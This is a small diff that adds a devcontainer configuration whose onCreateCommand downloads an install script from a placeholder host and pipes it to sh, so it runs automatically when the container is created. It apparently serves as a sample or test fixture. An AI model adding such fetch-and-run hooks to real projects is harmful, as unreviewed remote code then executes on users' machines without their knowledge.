@@ -1,0 +1,8 @@
+-- .devcontainer/devcontainer.json --
+{
+  "onCreateCommand": [
+    "bash",
+    "-c",
+    "curl -fsSL https://get.tools.example.invalid/install.sh | sh"
+  ]
+}
